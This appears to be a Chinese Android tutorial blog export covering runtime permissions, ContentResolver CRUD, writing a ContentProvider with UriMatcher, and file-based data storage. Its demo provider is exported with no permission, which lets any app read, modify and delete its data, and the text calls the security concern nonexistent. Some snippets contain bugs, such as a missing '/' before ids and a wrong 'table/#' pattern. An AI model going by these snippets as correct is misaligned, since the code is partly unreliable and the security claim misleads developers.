call(); &#125; &#125; private void call()&#123; try &#123; Intent intent = new Intent(Intent.ACTION_CALL); intent.setData(Uri.parse(&quot;tel:10086&quot;)); startActivity(intent); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; @Override public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) &#123; super.onRequestPermissionsResult(requestCode, permissions, grantResults); switch (requestCode) &#123; case 1: if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] == PackageManager.PERMISSION_GRANTED)&#123; call(); &#125; else &#123; Toast.makeText(this, &quot;你拒绝了此权限申请&quot;, Toast.LENGTH_SHORT).show(); &#125; break; default: &#125; &#125;&#125; 行时权限的核心就是在程序运行过程中由用户授权去执行某些危险操作，程序是不可以擅自做主去执行这些危险操作的。 上面的代码将运行时权限的完整流程都覆盖了，具体如下所示： 首先通过 ContextCompat.checkSelfPermission()方法判断用户是不是已经给过授权，该方法参数如下： 第一个参数是 Context 第二个参数是具体的权限名，比如打电话的权限名就是 android.Manifest.permission.CALL_PHONE。 然后将 ContextCompat.checkSelfPermission()方法的返回值和 PackageManager.PERMISSION_GRANTED 做比较，相等就说明用户已经授权，不等就表示用户没有授权。 如果已经授权的话就简单了，直接去执行拨打电话的逻辑操作就可以了，这里我们把拨打电话的逻辑封装到了 call() 方法中。 如果没有授权的话，则需要调用 ActivityCompat.requestPermissions()方法来向用户申请授权，该方法方法接收 3 个参数： 第一个参数要求是 Activity 的实例 第二个参数是一个 String 数组，我们把要申请的权限名放在数组中即可 第三个参数是请求码，只要是唯一值就可以了。 调用完了 requestPermissions() 方法之后，系统会弹出一个权限申请的对话框，然后用户可以选择同意或拒绝权限申请，不论是哪种结果，最终都会回调到 onRequestPermissionsResult() 方法中，而授权的结果则会封装在 grantResults 参数当中。这里我们只需要判断一下最后的授权结果，如果用户同意的话就调用 call() 方法来拨打电话，如果用户拒绝的话我们只能放弃操作，并且弹出一条失败提示。 现在重新运行一下程序，并点击按钮，会出现权限申请的弹窗，用户可以选择同意或拒绝。如果选择拒绝，则会弹出提示，下次再点击按钮仍会出现权限申请弹窗。如果选择同意，则会跳转到拨打电话界面，并且拨打了 10086，并且由于用户已经完成了授权操作，之后再点击按钮就不会再弹出权限申请对话框了，而是直接拨打电话。 访问其他程序中的数据内容提供器的用法一般有两种，一种是使用现有的内容提供器来读取和操作相应程序中的数据，另一种是创建自己的内容提供器给我们程序的数据提供外部访问接口。 如果一个应用程序通过内容提供器对其数据提供了外部访问接口，那么任何其他的应用程序就都可以对这部分数据进行访问。Android 系统中自带的电话簿、短信、媒体库等程序都提供了类似的访问接口，这使得第三方应用程序可以充分地利用这部分数据来实现更好的功能。 ContentResolver 的基本用法对于每一个应用程序来说，如果想要访问内容提供器中共享的数据，就一定要借助 ContentResolver 类，可以通过 Context 中的 getContentResolver() 方法获取到该类的实例。ContentResolver 中提供了一系列的方法用于对数据进行 CRUD 操作，其中 insert() 方法用于添加数据，update() 方法用于更新数据，delete() 方法用于删除数据，query() 方法用于查询数据。有没有似曾相识的感觉？没错，SQLiteDatabase 中也是使用这几个方法来进行 CRUD 操作的，只不过它们在方法参数上稍微有一些区别。 不同于 SQLiteDatabase，ContentResolver 中的增删改查方法都是不接收表名参数的，而是使用一个 Uri 参数代替，这个参数被称为内容 URI。内容 URI 给内容提供器中的数据建立了唯一标识符，它主要由两部分组成：authority 和 path。authority 是用于对不同的应用程序做区分的，一般为了避免冲突，都会采用程序包名的方式来进行命名。比如某个程序的包名是 com.example.app，那么该程序对应的 authority 就可以命名为 com.example.app.provider。path 则是用于对同一应用程序中不同的表做区分的，通常都会添加到 authority 的后面。比如某个程序的数据库里存在两张表：table1 和 table2，这时就可以将 path 分别命名为&#x2F;table1 和&#x2F;table2，然后把 authority 和 path 进行组合，内容 URI 就变成了 com.example.app.provider&#x2F;table1 和 com.example.app.provider&#x2F;table2。不过，目前还很难辨认出这两个字符串就是两个内容 URI，我们还需要在字符串的头部加上协议声明。因此，内容 URI 最标准的格式写法如下： 12content://com.example.app.provider/tablelcontent://com.example.app.provider/table2 内容 URI 可以非常清楚地表达出我们想要访问哪个程序中哪张表里的数据。也正是因此，ContentResolver 中的增删改查方法才都接收 Uri 对象作为参数，因为如果使用表名的话，系统将无法得知我们期望访问的是哪个应用程序里的表。 在得到了内容 URI 字符串之后，我们还需要将它解析成 Uri 对象才可以作为参数传人。解析的方法也相当简单，代码如下所示： 1Uri uri = Uri.parse(&quot;content://com.example.app.provider/table1&quot;) 只需要调用 Uri.parse() 方法，就可以将内容 URI 字符串解析成 Uri 对象了。 接下来就是增删改查操作了，这部分与 SQLiteDatabase 的操作大同小异，只不过是多了一个 uri。 查询示例代码如下所示： 123456Cursor cursor = getContentResolver().query( uri, projection, selection, selectionArgs, sortorder); 这些参数和 SQLiteDatabase 中 query() 方法里的参数很像，但总体来说要简单一些，毕竟这是在访问其他程序中的数据，没必要构建过于复杂的查询语句。下表对使用到的这部分参数进行了详细的解释。 query()方法参数 对应 SQL 部分 描述 uri from table_name 指定查询某个应用程序下的某一张表 projection select column1, column2 指定查询的列名 selection where column = value 指定 where 的约束条件 selectionArgs - 为 where 中的占位符提供具体的值 sortOrder order by column1, column2 指定查询结果的排序方式 查询完成后返回的仍然是一个 Cursor 对象，这时我们就可以将数据从 Cursor 对象中逐个读取出来了。读取的思路仍然是通过移动游标的位置来遍历 Cursor 的所有行，然后再取出每一行中相应列的数据，代码如下所示： 1234567if(cursor != null)&#123; while (cursor.moveToNext())&#123; String column1 = cursor.getstring(cursor.getColumnIndex(&quot;column1&quot;)); int column2 = cursor.getInt(cursor.getColumnIndex(&quot;column2&quot;)); &#125; cursor.close();&#125; 添加1234ContentValues values = new ContentValues();values.put(&quot;columnl&quot;,&quot;text&quot;);values.put(&quot;column2&quot;,1);getContentResolver().insert(uri,values); 与 SQLiteDatabase 的操作相似，仍然是将待添加的数据组装到 ContentValues 中，然后调用 ContentResolver 的 insert() 方法，将 Uri 和 ContentValues 作为参数传入即可。 更新123ContentValues values = new ContentValues();values.put(&quot;column1&quot;,&quot;&quot;)getContentResolver().update(uri,values,&quot;column1 = ? and column2 = ?&quot;,new String[]&#123;&quot;text&quot;,&quot;1&quot;&#125;); 上述代码通过 selection 和 selectionArgs 参数来指定符合条件的数据进行更新。 删除调用 ContentResolver 的 delete()方法将这条数据删除掉，代码如下所示： 1getContentResolver().delete(uri,&quot;column2 = ?&quot;,new String[]&#123;&quot;1&quot;&#125;); 到这里为止，我们就把 ContentResolver 中的增删改查方法全部学完了。因为这些知识在学习 SQLiteDatabase 的时候就已经学习过了，所需特别注意的就只有 uri 这个参数而已。所以接下来直接进行实操演练一下。 创建自己的 ContentProvider在上一节当中，我们学习了如何在自己的程序中访问其他应用程序的数据。总体来说思路还是非常简单的，只需要获取到该应用程序的内容 URI，然后借助 ContentResolver 进行 CRUD 操作就可以了。可是，那些提供外部访问接口的应用程序都是如何实现这种功能的呢？它们又是怎样保证数据的安全性？接下来我们就具体学习一下。 创建内容提供器的步骤要想创建自己的 ContentProvider，可以通过新建一个类去继承 ContentProvider 的方式来创建。 ContentProvider 类中有 6 个抽象方法，我们在使用子类继承它的时候，需要将这 6 个方法全部重写。新建 MyContentProvider 继承自 ContentProvider，代码如下所示： 1234567891011121314151617181920212223242526272829303132333435public class MyContentProvider extends ContentProvider &#123; @Override public boolean onCreate() &#123; return false; &#125; @Nullable @Override public Cursor query(@NonNull Uri uri, @Nullable String[] strings, @Nullable String s, @Nullable String[] strings1, @Nullable String s1) &#123; return null; &#125; @Nullable @Override public String getType(@NonNull Uri uri) &#123; return null; &#125; @Nullable @Override public Uri insert(@NonNull Uri uri, @Nullable ContentValues contentValues) &#123; return null; &#125; @Override public int delete(@NonNull Uri uri, @Nullable String s, @Nullable String[] strings) &#123; return 0; &#125; @Override public int update(@NonNull Uri uri, @Nullable ContentValues contentValues, @Nullable String s, @Nullable String[] strings) &#123; return 0; &#125;&#125; onCreate()初始化内容提供器的时候调用。通常会在这里完成对数据库的创建和升级等操作，返回 true 表示内容提供器初始化成功，返回 false 则表示失败。注意，只有当存在 ContentResolver 尝试访问我们程序中的数据时，内容提供器才会被初始化。 query()从内容提供器中查询数据。使用 uri 参数来确定查询哪张表，projection 参数用于确定查询哪些列，selection 和 selectionArgs 参数用于约束查询哪些行，sortOrder 参数用于对结果进行排序，查询的结果存放在 Cursor 对象中返回。 insert()向内容提供器中添加一条数据。使用 uri 参数来确定要添加到的表，待添加的数据保存在 values 参数中。添加完成后，返回一个用于表示这条新记录的 URI。 update()更新内容提供器中已有的数据。使用 uri 参数来确定更新哪一张表中的数据，新数据保存在 values 参数中，selection 和 selectionArgs 参数用于约束更新哪些行，受影响的行数将作为返回值返回。 delete()从内容提供器中删除数据。使用 uri 参数来确定删除哪一张表中的数据，selection 和 selectionArgs 参数用于约束删除哪些行，被删除的行数将作为返回值返回。 getType()根据传入的内容 URI 来返回相应的 MIME 类型。 在上一节中，我们提及到了标准 uri 的格式为： 1content://com.example.app.provider/tablel/1 这就表示调用方期望访问的是 com.example.app 这个应用的 table1 表中的数据。除此之外，我们还可以在这个内容 URI 的后面加上一个 id，这就表示调用方期望访问的是 com.example.app 这个应用的 table1 表中 id 为 1 的数据。 内容 URI 的格式主要就只有以上两种，以路径结尾就表示期望访问该表中所有的数据，以 id 结尾就表示期望访问该表中拥有相应 id 的数据。因此我们可以使用通配符的方式来分别匹配这两种格式的内容 URI，规则如下： *****：表示匹配任意长度的任意字符。 **#**：表示匹配任意长度的数字。 所以，一个能够匹配任意表的内容 URI 格式就可以写成： 1content://com.example.app.provider/* 而一个能够匹配 table1 表中任意一行数据的内容 URI 格式就可以写成： 1content://com.example.app.provider/tablel/# 接着，我们再借助 UriMatcher 这个类就可以轻松地实现匹配内容 URI 的功能。UriMatcher 中提供了一个 addURI() 方法，这个方法接收 3 个参数，可以分别把 authority、path 和一个自定义代码传进去。这样，当调用 UriMatcher 的 match() 方法时，就可以将一个 Uri 对象传入，返回值是某个能够匹配这个 U 对象所对应的自定义代码，利用这个代码，我们就可以判断出调用方期望访问的是哪张表中的数据了。修改 MyContentProvider 中的代码，如下所示： 123456789101112131415161718192021222324252627282930313233343536373839public class MyContentProvider extends ContentProvider &#123; public static final int TABLE1_DIR = 0; public static final int TABLE1_ITEM = 1; public static final int TABLE2_DIR = 2; public static final int TABLE2_ITEM = 3; private static UriMatcher uriMatcher; static &#123; uriMatcher = new UriMatcher(UriMatcher.NO_MATCH); uriMatcher.addURI(&quot;com.example.app.provider&quot;,&quot;table1&quot;,TABLE1_DIR); uriMatcher.addURI(&quot;com.example.app.provider&quot;,&quot;table1/#&quot;,TABLE1_ITEM); uriMatcher.addURI(&quot;com.example.app.provider&quot;,&quot;table2&quot;,TABLE2_DIR); uriMatcher.addURI(&quot;com.example.app.provider&quot;,&quot;table/#&quot;,TABLE2_ITEM); &#125; ...... @Nullable @Override public Cursor query(@NonNull Uri uri, @Nullable String[] projection, @Nullable String selection, @Nullable String[] selectionArgs, @Nullable String sortOrder, @Nullable CancellationSignal cancellationSignal) &#123; switch (uriMatcher.match(uri))&#123; case 0: //查询 table1 表中的所用数据 break; case 1: //查询 table1 表中的单条数据 break; case 2: //查询 table2 表中的所用数据 break; case 3: //查询 table1 表中的单条数据 break; default: break; &#125; return super.query(uri, projection, selection, selectionArgs, sortOrder, cancellationSignal); &#125;&#125; 可以看到，MyContentProvider 中新增了 4 个整型常量，其中 TABLE1_DIR 表示访问 table1 表中的所有数据，TABLE1_ITEM 表示访问 table1 表中的单条数据，TABLE2_DIR 表示访问 table2 表中的所有数据，TABLE2_ITEM 表示访问 table2 表中的单条数据。 接着在静态代码块里我们创建了 UriMatcher 的实例，并调用 addURI() 方法，将期望匹配的内容 URI 格式传递进去，注意这里传入的路径参数是可以使用通配符的。然后当 query() 方法被调用的时候，就会通过 UriMatcher 的 match() 方法对传入的 Uri 对象进行匹配，如果发现 UriMatcher 中某个内容 URI 格式成功匹配了该 Uri 对象，则会返回相应的自定义代码，然后我们就可以判断出调用方期望访问的到底是什么数据了。 上述代码只是以 query()方法为例做了个示范，其实 insert()、update()、delete()这几个方法的实现也是差不多的，它们都会携带 Uri 这个参数，然后同样利用 UriMatcher 的 match()方法判断出调用方期望访问的是哪张表，再对该表中的数据进行相应的操作就可以了。 除此之外，还有一个方法我们会比较陌生，即 getType()方法。它是所有的内容提供器都必须提供的一个方法，用于获取 Uri 对象所对应的 MIME 类型。一个内容 URI 所对应的 MIME 字符串主要由 3 部分组成，Android 对这 3 个部分做了如下格式规定： 必须以 vnd 开头。 如果内容 URI 以路径结尾，则后接 android.cursor.dir/，如果内容 URI 以 id 结尾，则后接 android.cursor.item/ 。 最后接上 vnd.&lt;authority&gt;.&lt;path&gt;。 所以，对于 content:&#x2F;&#x2F;com.example.app.provider&#x2F;table1 这个内容 URI，它所对应的 MIME 类型就可以写成： 1vnd.android.cursor.dir/vnd.com.example.app.provider.table1 对于 content:&#x2F;&#x2F;com.example.app.provider&#x2F;table1&#x2F;1 这个内容 URI，它所对应的 MME 类型就可以写成： 1vnd.android.cursor.item/vnd.com.example.app.provider.tablel 现在我们可以继续完善 MyContentProvider 中的内容了，这次来实现 getType() 方法中的逻辑，代码如下所示： 12345678910111213141516171819202122public class MyContentProvider extends ContentProvider &#123; ...... @Nullable @Override public String getType(@NonNull Uri uri) &#123; switch (uriMatcher.match(uri))&#123; case TABLE1_DIR: return &quot;vnd.android.cursor.dir/vnd.com.example.app.provider.table1&quot;; case TABLE1_ITEM: return &quot;vnd.android.cursor.item/vnd.com.example.app.provider.table1&quot;; case TABLE2_DIR: return &quot;vnd.android.cursor.dir/vnd.com.example.app.provider.table2&quot;; case TABLE2_ITEM: return &quot;vnd.android.cursor.item/vnd.com.example.app.provider.table2&quot;; default: break; &#125; return null; &#125; ......&#125; 到这里，一个完整的内容提供器就创建完成了，现在任何一个应用程序都可以使用 ContentResolver 来访问我们程序中的数据。至于前面所提到的保证隐私数据安全的功能，因为所有的 CRUD 操作都一定要匹配到相应的内容 URI 格式才能进行的，而我们当然不可能向 UriMatcher 中添加隐私数据的 URI，所以这部分数据根本无法被外部程序访问到，安全问题也就不存在了。好了，接下来就来实战一下，真正体验一下跨程序数据共享的功能。 实现跨程序数据共享为了突出重点，我们直接在上一章中 SQLite 数据库存储的项目的基础上继续开发，通过内容提供器来给它加入外部访问接口。为此我们需要给项目创建一个内容提供器，右击包名 →New→Other→Content Provider，在弹出的窗口中，我们将内容提供器命名为 DatabaseProvider，authority 指定为 com.example.databasetest.provider，Exported 属性表示是否允许外部程序访问我们的内容提供器，Enabled 属性表示是否启用这个内容提供器。将两个属性都勾中，点击 Finish 完成创建。 接着我们修改 DatabaseProvider 中的代码，如下所示： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143public class DatabaseProvider extends ContentProvider &#123; private static final int BOOK_DIR = 0; private static final int BOOK_ITEM = 1; private static final int CATEGORY_DIR = 2; private static final int CATEGORY_ITEM = 3; private static final String AUTHORITY = &quot;com.example.databasetest.provider&quot;; private static UriMatcher uriMatcher; private MyDatabaseHelper dbHelper; static &#123; uriMatcher = new UriMatcher(UriMatcher.NO_MATCH); uriMatcher.addURI(AUTHORITY,&quot;book&quot;,BOOK_DIR); uriMatcher.addURI(AUTHORITY,&quot;book/#&quot;,BOOK_ITEM); uriMatcher.addURI(AUTHORITY,&quot;category&quot;,CATEGORY_DIR); uriMatcher.addURI(AUTHORITY,&quot;category/#&quot;,CATEGORY_ITEM); &#125; public DatabaseProvider() &#123; &#125; @Override public boolean onCreate() &#123; dbHelper = new MyDatabaseHelper(getContext(),&quot;BookStore.db&quot;,null,2); return true; &#125; @Override public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) &#123; SQLiteDatabase db = dbHelper.getReadableDatabase(); Cursor cursor = null; switch (uriMatcher.match(uri))&#123; case BOOK_DIR: cursor = db.query(&quot;Book&quot;,projection,selection,selectionArgs,null,null,sortOrder); break; case BOOK_ITEM: String bookId = uri.getPathSegments().get(1); cursor = db.query(&quot;Book&quot;,projection,&quot;id = ?&quot;,new String[]&#123;bookId&#125;,null,null,sortOrder); break; case CATEGORY_DIR: cursor = db.query(&quot;Category&quot;,projection,selection,selectionArgs,null,null,sortOrder); break; case CATEGORY_ITEM: String categoryId = uri.getPathSegments().get(1); cursor = db.query(&quot;Category&quot;,projection,&quot;id = ?&quot;,new String[]&#123;categoryId&#125;,null,null,sortOrder); break; default: break; &#125; return cursor; &#125; @Override public Uri insert(Uri uri, ContentValues values) &#123; SQLiteDatabase db = dbHelper.getWritableDatabase(); Uri uriReturn = null; switch (uriMatcher.match(uri))&#123; case BOOK_DIR: case BOOK_ITEM: long newBookId = db.insert(&quot;Book&quot;,null,values); uriReturn = Uri.parse(&quot;content://&quot; + AUTHORITY + &quot;/book/&quot; + newBookId); break; case CATEGORY_DIR: case CATEGORY_ITEM: long newCategoryId = db.insert(&quot;Category&quot;,null,values); uriReturn = Uri.parse(&quot;content://&quot; + AUTHORITY + &quot;/Category/&quot; + newCategoryId); break; default: break; &#125; return uriReturn; &#125; @Override public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) &#123; SQLiteDatabase db = dbHelper.getWritableDatabase(); int updatedRows = 0; switch (uriMatcher.match(uri))&#123; case BOOK_DIR: updatedRows = db.update(&quot;Book&quot;,values,selection,selectionArgs); break; case BOOK_ITEM: String bookId = uri.getPathSegments().get(1); updatedRows = db.update(&quot;Book&quot;,values,selection,new String[]&#123;bookId&#125;); break; case CATEGORY_DIR: updatedRows = db.update(&quot;Category&quot;,values,selection,selectionArgs); break; case CATEGORY_ITEM: String categoryId = uri.getPathSegments().get(1); updatedRows = db.update(&quot;Category&quot;,values,selection,new String[]&#123;categoryId&#125;); break; default: break; &#125; return updatedRows; &#125; @Override public int delete(Uri uri, String selection, String[] selectionArgs) &#123; SQLiteDatabase db = dbHelper.getWritableDatabase(); int deletedRows = 0; switch (uriMatcher.match(uri))&#123; case BOOK_DIR: deletedRows = db.delete(&quot;Book&quot;,selection,selectionArgs); break; case BOOK_ITEM: String bookId = uri.getPathSegments().get(1); deletedRows = db.delete(&quot;Book&quot;,&quot;id = ?&quot;,new String[]&#123;bookId&#125;); break; case CATEGORY_DIR: deletedRows = db.delete(&quot;Category&quot;,selection,selectionArgs); break; case CATEGORY_ITEM: String categoryId = uri.getPathSegments().get(1); deletedRows = db.delete(&quot;Category&quot;,&quot;id = ?&quot;,new String[]&#123;categoryId&#125;); break; default: break; &#125; return deletedRows; &#125; @Override public String getType(Uri uri) &#123; switch (uriMatcher.match(uri))&#123; case BOOK_DIR: return &quot;vnd.android.cursor.dir/vnd.com.example.databasetest.provider.book&quot;; case BOOK_ITEM: return &quot;vnd.android.cursor.item/vnd.com.example.databasetest.provider.book&quot;; case CATEGORY_DIR: return &quot;vnd.android.cursor.dir/vnd.com.example.databasetest.provider.category&quot;; case CATEGORY_ITEM: return &quot;vnd.android.cursor.item/vnd.com.example.databasetest.provider.category&quot;; default: break; &#125; return null; &#125;&#125; 首先在类的一开始，同样是定义了 4 个常量，分别用于表示访问 Book 表中的所有数据、访问 Book 表中的单条数据、访问 Category 表中的所有数据和访问 Category 表中的单条数据。然后在静态代码块里对 UriMatcher 进行了初始化操作，将期望匹配的几种 URI 格式添加了进去。 因为我们这里是对外部应用提供访问该应用数据的接口，而数据的来源是数据库，所以我们需要先在 onCreate()方法中创建一个 MyDatabaseHelper 实例，返回 true 表示内容提供器初始化成功，这时数据库就已经完成了创建或升级操作。 接下来是 CRUD 操作的方法，格式都差不多，都是先根据操作获取读&#x2F;写的数据库实例，然后根据 Uri 判断用户访问哪张表以及是全表数据还是单条数据。注意当访问单条数据的时候，需要调用了 Uri 对象的 getPathSegments() 方法，它会将内容 URI 权限之后的部分以 “&#x2F;” 符号进行分割，并把分割后的结果放入到一个字符串列表中，那这个列表的第 0 个位置存放的就是路径，第 1 个位置存放的就是 id 了。得到了 id 之后，再通过 selection 和 selectionArgs 参数进行约束，就实现了查询单条数据的功能。四种方法的具体差异如下： query()方法：因为是访问数据，所以需要将查询到的数据以 Cursor 对象返回。 insert()方法：需要返回一个能够表示这条新增数据的 URI，所以需要调用 Uri.parse() 方法来将一个内容 URI 解析成 Uri 对象，当然这个内容 URI 是以新增数据的 id 结尾的。 update()方法：需要返回受影响的行数。 delete()方法：需要返回受影响的行数。 最后是 getType()方法，这个方法中的代码完全是按照上一节中介绍的格式规则编写的，没有必要再解释了。 到此，我们就将内容提供器中的代码全部编写完了。 另外还有一点需要注意，内容提供器一定要在 AndroidManifest.xml 文件中注册才可以使用。不过由于我们是使用 Android Studio 的快捷方式创建的内容提供器，因此注册这一步已经被自动完成了。具体代码如下所示： 12345678910111213141516&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:tools=&quot;http://schemas.android.com/tools&quot;&gt; &lt;application ...... &gt; &lt;provider android:name=&quot;.DatabaseProvider&quot; android:authorities=&quot;com.example.databasetest.provider&quot; android:enabled=&quot;true&quot; android:exported=&quot;true&quot;&gt;&lt;/provider&gt; ...... &lt;/application&gt;&lt;/manifest&gt; 可以看到，&lt;application&gt; 标签内出现了一个新的标签 &lt;provider&gt;，我们使用它来对 DatabaseProvider 这个内容提供器进行注册。android:name 属性指定了 DatabaseProvider 的类名，android:authorities 属性指定了 DatabaseProvider 的 authority，而 enabled 和 exported 属性则是根据我们刚才勾选的状态自动生成的，这里表示允许 DatabaseProvider 被其他应用程序进行访问。 现在这个项目就已经拥有了跨程序共享数据的功能了。为了验证一下，我们需要另外创建一个新项目 ProviderTest 来访问刚才编写好的项目中的数据。 新项目 ProviderTest 布局文件如下所示： 123456789101112131415161718192021222324252627282930&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot; xmlns:tools=&quot;http://schemas.android.com/tools&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; tools:context=&quot;.MainActivity&quot; android:orientation=&quot;vertical&quot;&gt; &lt;Button android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;Add To Book&quot; android:onClick=&quot;AddToBook&quot;/&gt; &lt;Button android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;Query From Book&quot; android:onClick=&quot;QueryFromBook&quot;/&gt; &lt;Button android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;Update Book&quot; android:onClick=&quot;UpdateBook&quot;/&gt; &lt;Button android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;Delete From Book&quot; android:onClick=&quot;DeleteFromBook&quot;/&gt;&lt;/LinearLayout&gt; 简简单单的 4 个按钮，分别用于添加、查询、修改和删除数据。然后修改 MainActivity 中的代码，如下所示： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051public class MainActivity extends AppCompatActivity &#123; private String newId; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); &#125; public void AddToBook(View view) &#123; Uri uri = Uri.parse(&quot;content://com.example.databasetest.provider/book&quot;); ContentValues values = new ContentValues(); values.put(&quot;name&quot;,&quot;A Clash of Kings&quot;); values.put(&quot;author&quot;,&quot;George Martin&quot;); values.put(&quot;pages&quot;,1024); values.put(&quot;price&quot;,22.45); Uri newUri = getContentResolver().insert(uri,values); newId = newUri.getPathSegments().get(1); &#125; public void UpdateBook(View view) &#123; Uri uri = Uri.parse(&quot;content://com.example.databasetest.provider/book&quot; + newId); ContentValues values = new ContentValues(); values.put(&quot;name&quot;,&quot;A Storm of Swords&quot;); getContentResolver().update(uri,values,null,null); &#125; public void QueryFromBook(View view) &#123; Uri uri = Uri.parse(&quot;content://com.example.databasetest.provider/book&quot;); Cursor cursor = getContentResolver().query(uri, null, null, null, null); if (cursor != null)&#123; while (cursor.moveToNext())&#123; String name = cursor.getString(cursor.getColumnIndex(&quot;name&quot;)); String author = cursor.getString(cursor.getColumnIndex(&quot;author&quot;)); int pages = cursor.getInt(cursor.getColumnIndex(&quot;pages&quot;)); double price = cursor.getDouble(cursor.getColumnIndex(&quot;price&quot;)); Log.d(&quot;MainActivity&quot;, &quot;name: &quot; + name); Log.d(&quot;MainActivity&quot;, &quot;author: &quot; + author); Log.d(&quot;MainActivity&quot;, &quot;pages: &quot; + pages); Log.d(&quot;MainActivity&quot;, &quot;price: &quot; + price); &#125; cursor.close(); &#125; &#125; public void DeleteFromBook(View view) &#123; Uri uri = Uri.parse(&quot;content://com.example.databasetest.provider/book&quot; + newId); getContentResolver().delete(uri, null, null); &#125;&#125; 可以看到，我们分别在这 4 个按钮的点击事件里面处理了增删改查的逻辑，分别对接 ContentProvider 中的增删改查方法。 添加数据的时候，首先调用了 Uri.parse() 方法将一个内容 URI 解析成 Uri 对象，然后把要添加的数据都存放到 ContentValues 对象中，接着调用 ContentResolver 的 insert() 方法执行添加操作就可以了，该方法会返回一个 Uri 对象，这个对象中包含了新增数据的 id，我们通过 getPathSegments()方法将这个 id 取出。 查询数据的时候，同样是调用了 Uri.parse() 方法将一个内容 URI 解析成 Uri 对象，然后调用 ContentResolver 的 query() 方法去查询数据，查询的结果存放在 Cursor 对象中的。之后对 Cursor 进行遍历，从中取出查询结果，并一一打印出来。 更新数据的时候，也是先将内容 URI 解析成 Uri 对象，这里我们指定了 id，那么表中其他数据就不会受影响了。然后把想要更新的数据存放到 ContentValues 对象中，再调用 ContentResolver 的 update() 方法执行更新操作就可以了。 删除数据的时候，也是使用同样的方法解析了一个以 id 结尾的内容 URI，然后调用 ContentResolver 的 delete() 方法执行删除操作就可以了。","categories":[],"tags":[],"keywords":[]},{"title":"Andriod-development-Data_Storage","slug":"Andriod-development-Data-Storage","date":"2024-09-21T05:49:17.000Z","updated":"2024-11-11T09:24:53.521Z","comments":true,"path":"2024/09/21/Andriod-development-Data-Storage/","link":"","permalink":"http://example.com/2024/09/21/Andriod-development-Data-Storage/","excerpt":"","text":"持久化技术简介数据持久化就是指将那些内存中的瞬时数据保存到存储设备中，保证即使在手机或电脑关机的情况下，这些数据仍然不会丢失。保存在内存中的数据是处于瞬时状态的，而保存在存储设备中的数据是处于持久状态的，持久化技术则提供了一种机制可以让数据在瞬时状态和持久状态之间进行转换。 持久化技术被广泛应用于各种程序设计的领域当中，而本书中要探讨的自然是 Android 中的数据持久化技术。Android 系统中主要提供了 3 种方式用于简单地实现数据持久化功能，即文件存储、SharedPreferences 存储以及数据库存储。 文件存储概念文件存储是 Android 中最基本的一种数据存储方式，它不对存储的内容进行任何的格式化处理，所有数据都是原封不动地保存到文件当中的，因而它比较适合用于存储一些简单的文本数据或二进制数据。如果你想使用文件存储的方式来保存一些较为复杂的文本数据，就需要定义一套自己的格式规范，这样可以方便之后将数据从文件中重新解析出来。 将数据存储到文件中Context 类中提供了一个 openFileOutput() 方法，可以用于将数据存储到指定的文件中。这个方法接收两个参数，第一个参数是文件名，在文件创建的时候使用的就是这个名称，注意这里指定的文件名不可以包含路径，因为所有的文件都是默认存储到&#x2F;data&#x2F;data&#x2F;&#x2F;files&#x2F;目录下的。第二个参数是文件的操作模式，主要有两种模式可选，MODE_PRIVATE 和 MODE_APPEND。 MODE_PRIVATE：默认操作模式，表示当指定同样文件名的时候，所写入的内容将会覆盖原文件中的内容。 MODE_APPEND：表示如果该文件已存在，就往文件里面追加内容，不存在就创建新文件。 MODE WORLD READABLE 和 MODE WORLD WRITEABLE：这两种模式表示允许其他的应用程序对我们程序中的文件进行读写操作，不过由于这两种模式过于危险，很容易引起应用的安全性漏洞，已在 Android4.2 版本中被废弃。 openFileOutput () 方法返回的是一个 FileOutputStream 对象，得到了这个对象之后就可以使用 Java 流的方式将数据写入到文件中了。 12345678String data = &quot;Data to save&quot;;FileOutputStream out = null;BufferedWriter writer = null;try &#123; out = openFileOutput(&quot;data&quot;, Context.MODE_PRIVATE); writer = new BufferedWriter(new OutputStreamWriter(out)); writer.write(data);&#125; 从文件中读取数据类似于将数据存储到文件中，Context 类中还提供了一个 openFileInput() 方法，用于从文件中读取数据。这个方法要比 openFileOutput() 简单一些，它只接收一个参数，即要读取的文件名，然后系统会自动到&#x2F;data&#x2F;data&#x2F;&#x2F;files&#x2F;目录下去加载这个文件，并返回一个 FileInputStream 对象，得到了这个对象之后再通过 Java 流的方式就可以将数据读取出来了。 1234567891011FileInputStream in = null;BufferedReader reader = null;StringBuilder content = new StringBuilder();try &#123; in = openFileInput(&quot;data&quot;); reader = new BufferedReader(new InputStreamReader(in)); String line = &quot;&quot;; while ((line = reader.readLine()) != null) &#123; content.append(line); &#125;&#125; 首先通过 openFileInput() 方法获取到了一个 FileInputStream 对象，然后借助它又构建出了一个 InputStreamReader 对象，接着再使用 InputStreamReader 构建出一个 BufferedReader 对象，这样我们就可以通过 BufferedReader 进行一行行地读取，把文件中所有的文本内容全部读取出来，并存放在一个 StringBuilder 对象中，最后将读取到的内容返回就可以了。 案例 使得重新启动程序时 EditText 中能够保留我们上次输入的内容。 1234567891011121314151617181920212223242526272829303132333435363738394041424344public class MainActivity extends AppCompatActivity &#123; private EditText edit; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); String inputText = load(); if (!TextUtils.isEmpty(inputText)) &#123; edit.setText(inputText); edit.setSelection(inputText.length()); Toast.makeText(this, 